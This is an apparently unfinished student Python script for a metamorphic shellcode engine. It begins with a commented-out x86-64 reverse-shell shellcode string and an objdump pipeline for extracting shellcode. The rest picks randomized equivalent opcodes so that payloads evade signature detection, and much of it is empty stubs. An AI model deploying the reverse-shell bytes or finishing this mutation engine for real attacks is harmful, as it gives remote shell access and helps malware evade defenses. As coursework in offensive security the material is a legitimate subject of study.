import random

# using objdump on my asm reverse shell executable i got this :
#       objdump -d ./executable|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr│
#       -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|se│
#       d 's/$/"/g' 

# my_code = "\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x06\x00\x00\x00\x0f\x05\x50\xeb\x00\xb8\x2a\x00\x00\x00\x5f\x57\x48\xbe\x00\x20\x40\x00\x00\x00\x00\xba\x10\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x02\x00\x00\x00\x0f\x05\xeb\x00\xb8\x3b\x00\x00\x00\x48\xbf\x08\x20\x40\x00\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"
# print(my_code)

##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------
##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------
##------------------TO DO !!!!! MUST METAMORPH NULL BYTES BECAUSE THEY WILL BE TRUNKED-----------------------





#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def int_to_hex_and_bits(integer_value):
    # Convert the integer to hexadecimal representation
    hex_value = hex(integer_value)[2:].upper()

    # Make sure the hex number has an even number of digits by adding leading zeros if needed
    if len(hex_value) % 2 != 0:
        hex_value = "0" + hex_value

    # Insert spaces between each two digits
    hex_value_with_spaces = ' '.join(hex_value[i:i+2] for i in range(0, len(hex_value), 2))

    # Reverse the order of the bytes to represent in little-endian format
    little_endian_hex = ' '.join(hex_value_with_spaces.split()[::-1])

    # Calculate the length of the integer in bits
    bit_length = integer_value.bit_length()

    return little_endian_hex, bit_length


# Example usage:
# integer_value = 305419896
# little_endian_hex, bits = int_to_hex_and_bits(integer_value)
# print("Decimal: {0}, Hexadecimal (Little-endian): {1}, Length in Bits: {2}".format(integer_value, little_endian_hex, bits))



#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------






# A function that takes the OPCODE and XORs it (clears it)
def clear(register):    
    l=[]
    # rax
    if (register == "4831C0"):
        l = ["4831D24889D0", "4831C0"]

    # rdi
    if (register == "4831FF"):
        l = ["4831FF","4831C04889C7"]

    # rsi
    if (register == "4831F6"):
        l = ["4831F6","4831D24889D6"]

    # rdx
    if (register == "4831D2"):
        l = ["4831D2","4831FF4889FA"]

    opcode = random.choice(l)
    return opcode
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------








#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RAX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------

# mov rax, rdi = 48 89 f8 
def mov_rax_rdi():
    list_ = ["48 89 f8"]
# mov rax, rsi = 48 89 f0 
def mov_rax_rsi():
    list_ = ["48 89 f0"]
# mov rax, rdx = 48 89 d0
def mov_rax_rdx():
    list_ = ["48 89 d0"]
# mov rax, rax = 48 89 c0
def mov_rax_rax():
    list_ = ["48 89 c0"]

#  mov RAX, ( an integer > 32 & =< 64 bits ) |||||| 48 c7 c0 XX XX XX XX
def mov_rax_valeur(value):
    opcode = "48 c7 c0"
    little_endian_hex, bits = int_to_hex_and_bits(value)
    if (bits > 32 & bits <= 64):
        list_ = [opcode + " " + little_endian_hex]
    elif (bits > 16 & bits <= 32):
        list_ = [opcode + " " + little_endian_hex]
    elif (bits > 8 & bits <= 16):
        list_ = [opcode + " " + little_endian_hex]
    elif (bits >= 0 & bits <= 8):
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)

#####  mov EAX, ( an integer > 16 & =< 32 bits ) |||||| b8 XX XX XX XX
def mov_eax_valeur(value):
    list_ = []
##########  mov AX, (an integer > 8 & =< 16 bits ) |||||| 66 b8 XX XX
def mov_ax_valeur(value):
    list_ = []
###############  mov AL, (an integer =< 8 bits ) ||||||= b0 XX
def mov_al_valeur(value):
    list_ = []


#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



# mov rdi, rdi = 48 89 f8 
def mov_rdi_rdi():
    list_ = ["48 89 ff"]
# mov rdi, rsi = 48 89 f0 
def mov_rdi_rsi():
    list_ = ["48 89 f7"]
# mov rdi, rdx = 48 89 d0
def mov_rdi_rdx():
    list_ = ["48 89 d7"]
# mov rdi, rax = 48 89 c0
def mov_rdi_rax():
    list_ = ["48 89 c7"]




#  mov RDI, ( an integer > 32 & =< 64 bits ) |||||| 48 c7 c7 XX XX XX XX
def mov_rdi_valeur(value):
    list_ = []
#####  mov EDI, ( an integer > 16 & =< 32 bits ) |||||| bf XX XX XX XX
def mov_edi_valeur(value):
    list_ = []
##########  mov DI, (an integer > 8 & =< 16 bits ) |||||| 66 bf XX XX
def mov_di_valeur(value):
    list_ = []
###############  mov DIL, (an integer =< 8 bits )  |||||| 40 b7 XX
def mov_dil_valeur(value):
    list_ = []


#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RSI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------




# mov rsi, rdi = 48 89 fe 
def mov_rsi_rdi():
    list_ = ["48 89 fe"]
# mov rsi, rsi = 48 89 f6
def mov_rsi_rsi():
    list_ = ["48 89 f6"]
# mov rsi, rdx = 48 89 d6
def mov_rsi_rdx():
    list_ = ["48 89 d6"]
# mov rsi, rax = 48 89 c6
def mov_rsi_rax():
    list_ = ["48 89 c6"]


#  mov RSI, ( an integer > 32 & =< 64 bits ) |||||| 48 C7 C6 XX XX XX XX
def mov_rsi_valeur(value):
    list_ = []
#####  mov ESI, ( an integer > 16 & =< 32 bits ) |||||| BE XX XX XX XX
def mov_esi_valeur(value):
    list_ = []
##########  mov SI, (an integer > 8 & =< 16 bits ) |||||| 66 BE XX XX
def mov_si_valeur(value):
    list_ = []
###############  mov SIL, (an integer =< 8 bits ) |||||| 40 b6 XX
def mov_sil_valeur(value):
    list_ = []



#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



# mov rdx, rdi = 48 89 fa
def mov_rdx_rdi():
    list_ = ["48 89 fa"]
# mov rdx, rsi = 48 89 f2
def mov_rdx_rsi():
    list_ = ["48 89 f2"]
# mov rdx, rdx = 48 89 d2
def mov_rdx_rdx():
    list_ = ["48 89 d2"]
# mov rdx, rax = 48 89 c2
def mov_rdx_rax():
    list_ = ["48 89 c2"]


#  mov RDX, ( an integer > 32 & =< 64 bits ) |||||| 48 C7 C2 XX XX XX XX
def mov_rdx_valeur(value):
    list_ = []
#####  mov EDX, ( an integer > 16 & =< 32 bits ) |||||| BA XX XX XX XX
def mov_edx_valeur(value):
    list_ = [] 
##########  mov DX, (an integer > 8 & =< 16 bits ) |||||| 66 BA XX XX
def mov_dx_valeur(value):
    list_ = []
###############  mov DL, (an integer =< 8 bits ) |||||| B2 XX
def mov_dl_valeur(value):
    list_ = []







print(mov_rax_valeur(4122))







#### exemple du prof pour sys_exit

# mov al,06 : b0 3c
# mov al, 99, sub al, 39
# mov al, 30 ; add al, 30
# mov 







